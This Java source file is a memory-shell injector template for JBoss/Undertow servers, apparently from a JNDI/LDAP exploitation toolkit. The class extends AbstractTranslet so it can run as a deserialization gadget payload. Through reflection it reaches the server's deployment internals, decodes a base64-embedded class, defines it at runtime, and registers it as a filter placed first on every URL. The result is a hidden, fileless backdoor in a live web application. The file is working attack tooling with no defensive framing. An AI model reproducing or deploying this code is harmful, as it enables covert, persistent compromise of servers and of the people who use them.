package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.FilterInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;
import sun.misc.BASE64Decoder;
import javax.security.jacc.PolicyContext;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Map;

public class JBossMemshellTemplate extends AbstractTranslet {
    public String DynamicFilterTemplateB64Code;

    public JBossMemshellTemplate(){
        try{
            String filterName = "dynamicFilter";
            String urlPattern = "/*";

            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            ServletContext context = request.getServletContext();
            Field f = context.getClass().getDeclaredField("deploymentInfo");
            f.setAccessible(true);
            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);

            //只添加一次
            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
            if(!filters.containsKey(filterName)){
                System.out.println("[+] Add Dynamic Filter");

                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz = null;
                try{
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    byte[] bytes = base64Decoder.decodeBuffer(DynamicFilterTemplateB64Code);

                    Method method0 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method0.setAccessible(true);
                    clazz = (Class) method0.invoke(cl, bytes, 0, bytes.length);

                }catch (Exception ex){
                    ex.printStackTrace();
                }

                FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
                deploymentInfo.addFilter(filter);

                f = context.getClass().getDeclaredField("deployment");
                f.setAccessible(true);
                Field modifiersField = Field.class.getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
                deployment.getFilters().addFilter(filter);

                // 0 表示把我们动态注册的 filter 放在第一位
                deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
